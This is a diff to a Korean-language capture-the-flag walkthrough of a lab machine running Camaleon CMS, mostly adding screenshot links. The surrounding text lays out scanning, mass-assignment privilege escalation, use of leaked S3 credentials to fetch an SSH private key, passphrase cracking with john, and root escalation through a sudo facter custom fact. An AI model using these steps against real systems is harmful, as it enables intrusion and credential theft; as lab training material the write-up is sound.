@@ -22,6 +22,8 @@ Facts는 Ruby on Rails 기반의 Camaleon CMS를 운영하는 Linux 머신이다
 nmap -sC -sV 10.129.1.229
 ```
 
+![nmap scan](images/nmap-initial.png)
+
 | 포트 | 서비스 | 비고 |
 |------|--------|------|
 | 22/tcp | OpenSSH 9.9p1 | Ubuntu Linux |
@@ -37,15 +39,23 @@ echo "10.129.1.229 facts.htb" | sudo tee -a /etc/hosts
 
 ### 웹 애플리케이션 식별
 
-브라우저로 `http://facts.htb/`에 접속하면 트리비아 퀴즈 사이트가 표시된다. Wappalyzer로 기술 스택을 분석하면 백엔드가 식별되지 않는다.
+브라우저로 `http://facts.htb/`에 접속하면 트리비아 퀴즈 사이트가 표시된다.
+
+![facts homepage](images/homepage.png)
+
+Wappalyzer로 기술 스택을 분석하면 백엔드가 식별되지 않는다.
+
+![wappalyzer result](images/wappalyzer.png)
 
 HTTP 요청의 세션 쿠키 이름에서 Rails 애플리케이션임이 드러난다.
 
 ```
-Cookie: _factsapp_session=... : _appname_session
+Cookie: _factsapp_session=...
 ```
 
 `_<appname>_session`은 Ruby on Rails의 기본 세션 쿠키 명명 규칙이다.
+
+![burp session cookie](images/burp-session-cookie.png)
 
 ### CMS 식별
 
@@ -69,6 +79,8 @@ feroxbuster -u http://facts.htb/ \
   -t 50 --no-recursion
 ```
 
+![feroxbuster scan](images/feroxbuster-scan.png)
+
 주목할 엔드포인트:
 
 | 경로 | 상태 | 비고 |
@@ -87,6 +99,8 @@ feroxbuster -u http://facts.htb/ \
 ### 일반 유저 등록
 
 `http://facts.htb/admin/register`에서 계정을 생성한다. 등록 직후 관리자 패널(`/admin/dashboard`)로 리다이렉트되며 `Client` 권한으로 로그인된다.
+
+![admin login created](images/admin-login-created.png)
 
 ### Mass Assignment를 통한 권한 상승
 
@@ -127,6 +141,8 @@ _method=patch&authenticity_token=...&password[password]=Test1234!&password[passw
 
 관리자 권한으로 `Settings → General Site → Filesystem Settings` 탭에 접근하면 AWS S3 설정이 평문으로 노출된다.
 
+![admin s3 credentials](images/admin-s3-credentials.png)
+
 | 항목 | 값 |
 |------|-----|
 | AWS Access Key | `AKIAE56E043E17C302AD` |
@@ -149,6 +165,8 @@ aws s3 ls \
   --no-verify-ssl
 ```
 
+![aws s3 ls buckets](images/aws-s3-ls-buckets.png)
+
 ```
 2025-09-11 21:06:52 internal
 2025-09-11 21:06:52 randomfacts
@@ -165,6 +183,8 @@ aws s3 ls s3://internal/ \
   --no-verify-ssl \
   --recursive | grep -v ".bundle"
 ```
+
+![aws s3 ls internal](images/aws-s3-ls-internal.png)
 
 ```
 2026-01-09 03:45:13        220 .bash_logout
@@ -191,7 +211,11 @@ aws s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519 \
   --no-verify-ssl
 ```
 
+![aws s3 cp sshkey](images/aws-s3-cp-sshkey.png)
+
 개인키를 확인하면 `aes256-ctr` + `bcrypt`로 암호화되어 있어 패스프레이즈가 필요하다.
+
+![id ed25519 content](images/id-ed25519-content.png)
 
 ### 패스프레이즈 크래킹
 
@@ -199,6 +223,8 @@ aws s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519 \
 ssh2john id_ed25519 > id_ed25519.hash
 john id_ed25519.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
+
+![ssh2john crack](images/ssh2john-crack.png)
 
 ```
 dragonballz      (id_ed25519)
@@ -212,6 +238,8 @@ dragonballz      (id_ed25519)
 eval $(ssh-agent -s)
 ssh-add id_ed25519
 ```
+
+![ssh add key](images/ssh-add-key.png)
 
 ```
 Identity added: /home/bugi/id_ed25519 (trivia@facts.htb)
@@ -227,6 +255,8 @@ ssh -i id_ed25519 trivia@facts.htb
 ```
 
 패스프레이즈 `dragonballz` 입력 후 접속에 성공한다.
+
+![ssh login trivia](images/ssh-login-trivia.png)
 
 ```bash
 cat /home/william/user.txt
@@ -266,6 +296,8 @@ EOF
 sudo facter --custom-dir /tmp/facts evil
 ```
 
+![facter privesc](images/facter-privesc.png)
+
 `setcode` 블록 안의 백틱 명령어가 root 권한으로 실행되어 `root.txt` 내용이 출력된다.
 
 ---
@@ -304,4 +336,3 @@ S3 호환 스토리지에 SSH 개인키를 저장하는 것은 키 자체의 암
 | 유저명 식별 | ssh-agent 등록 시 개인키 코멘트 추출 | ssh-add |
 | 초기 셸 | SSH 키 인증으로 trivia 접속 | ssh |
 | 권한 상승 | sudo facter 커스텀 팩트로 root 코드 실행 | facter |
-
